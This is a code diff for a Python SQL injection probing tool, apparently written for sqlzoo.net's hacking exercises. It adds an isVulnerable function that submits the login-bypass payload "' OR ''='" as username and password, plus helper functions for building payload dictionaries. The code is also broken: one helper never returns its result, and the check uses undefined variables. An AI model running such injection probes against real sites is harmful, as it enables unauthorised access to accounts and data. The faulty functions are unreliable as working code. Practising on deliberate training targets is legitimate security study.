@@ -327,9 +327,39 @@ def userNameLike(ch, url, notLike = False, notLikeName = ""):
    return readQuery(txt)
 
 
+def payloadDictionary(payload, lst):
+   """creates payload dictionary.
+      
+      Args:
+         payload: String
+            SQL query
+         lst: List of Strings
+            keywords for payload dictionary
+   """
+   dikt = {}
+   for i in lst:
+      dikt[i] = payload
+
+def NamePasswordDictionary(payload, username, password):
+   """ wrapper for payloadDictionary   """
+   lst = [username, password]
+   return payloadDictionary(payload, lst)
+
+def isVulnerable(url):
+   """returns true if site is vulnerable to sql injections. Customize parser function (readQuery) to work for other sites.
 
 
+   """
+   payload = "' OR ''='"
+   payload = NamePasswordDictionary(payload, name, password)
+   txt = sendQuery(payload, url)
+   return readQuery(txt)
 
+def characterInTableName():
+   """
+   https://sqlzoo.net/hack/24table.htm
+
+   """
 
 
 """
